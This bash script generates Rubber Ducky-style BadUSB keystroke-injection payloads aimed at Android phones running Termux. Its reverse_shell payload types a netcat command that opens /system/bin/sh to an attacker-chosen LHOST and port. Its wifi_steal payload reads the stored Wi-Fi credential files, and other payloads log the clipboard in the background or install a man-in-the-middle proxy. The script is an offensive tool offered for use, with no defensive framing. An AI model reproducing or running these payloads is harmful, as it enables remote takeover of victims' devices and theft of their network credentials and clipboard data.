#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

G='\033[38;5;82m'; R='\033[38;5;196m'; Y='\033[38;5;226m'; C='\033[38;5;51m'; B='\033[1m'; D='\033[2m'; NC='\033[0m'

log() { echo -e "${C}[*]${NC} ${B}$1${NC}"; }
ok()  { echo -e "${G}[+]${NC} ${B}$1${NC}"; }
warn() { echo -e "${Y}[!]${NC} ${B}$1${NC}"; }
err() { echo -e "${R}[x]${NC} ${B}$1${NC}"; }

PAYLOAD_ID="${1:-}"
TARGET_OS="${2:-android}"
DEVICE_TYPE="${3:-rubber_ducky}"
OUTPUT="${4:-}"
LHOST="${5:-}"
LPORT="${6:-4444}"
OUTPUT_LIST=()

if [[ -z "$PAYLOAD_ID" ]]; then
  err "PAYLOAD_ID required"
  echo '{"status":"failed","output":["PAYLOAD_ID required"]}'
  exit 1
fi

OUTPUT="${OUTPUT:-/tmp/badusb_${PAYLOAD_ID}_${TARGET_OS}.txt}"

generate_payload() {
  case "$PAYLOAD_ID" in
    reverse_shell)
      cat <<EOF
REM Reverse Shell for $TARGET_OS
DELAY 1000
GUI SPACE
DELAY 500
STRING termux
ENTER
DELAY 2000
STRING nc ${LHOST:-LHOST} ${LPORT} -e /system/bin/sh
ENTER
EOF
      ;;
    wifi_steal)
      cat <<EOF
REM WiFi Stealer for $TARGET_OS
DELAY 1000
GUI SPACE
DELAY 500
STRING termux
ENTER
DELAY 2000
STRING cat /data/misc/wifi/wpa_supplicant.conf
ENTER
DELAY 1000
STRING cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null
ENTER
EOF
      ;;
    keylog)
      cat <<EOF
REM Keylogger for $TARGET_OS
DELAY 1000
GUI SPACE
DELAY 500
STRING termux
ENTER
DELAY 2000
STRING apt install -y termux-api
ENTER
DELAY 5000
STRING termux-clipboard-get >> /sdcard/clipboard.log &
ENTER
EOF
      ;;
    mitm)
      cat <<EOF
REM MITM Proxy Setup for $TARGET_OS
DELAY 1000
GUI SPACE
DELAY 500
STRING termux
ENTER
DELAY 2000
STRING apt install -y mitmproxy
ENTER
EOF
      ;;
    *)
      cat <<EOF
REM $TARGET_OS Payload: $PAYLOAD_ID
DELAY 1000
GUI SPACE
DELAY 500
STRING termux
ENTER
DELAY 2000
STRING echo "Payload $PAYLOAD_ID executed"
ENTER
EOF
      ;;
  esac
}

log "Generating $DEVICE_TYPE payload for $TARGET_OS (ID: $PAYLOAD_ID)"
generate_payload > "$OUTPUT"

LINES=$(wc -l < "$OUTPUT")
ok "Payload saved: $OUTPUT ($LINES lines)"
OUTPUT_LIST+=("$OUTPUT ($LINES lines)")

echo "{\"status\":\"success\",\"output\":[\"${OUTPUT_LIST[*]//\"/\\\"}\"]}"
